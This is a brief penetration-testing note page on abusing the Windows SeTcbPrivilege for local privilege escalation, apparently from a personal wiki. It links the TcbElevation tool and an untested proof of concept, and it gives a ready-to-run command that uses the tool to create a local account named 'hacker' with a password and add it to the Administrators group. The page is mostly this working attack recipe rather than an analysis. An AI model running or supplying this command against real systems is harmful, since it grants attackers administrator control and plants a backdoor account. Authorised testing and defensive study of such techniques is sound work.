---
title: SeTcbPrivilege
---

This [[notes/windows/privilege]] allows local privilege escalation.

With [TcbElevation](https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178).
*Error starting service 1053* is expected.

~~~ bat
.\TcbElevation.exe LaLaLa "C:\Windows\System32\cmd.exe /c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
~~~

Untested tools:

- [SeTcbPrivilegePoC](https://github.com/daem0nc0re/PrivFu/blob/main/PrivilegedOperations/SeTcbPrivilegePoC)

References:

- <https://twitter.com/splinter_code/status/1568548572861267968>
- <https://twitter.com/decoder_it/status/1568930949659762693/>
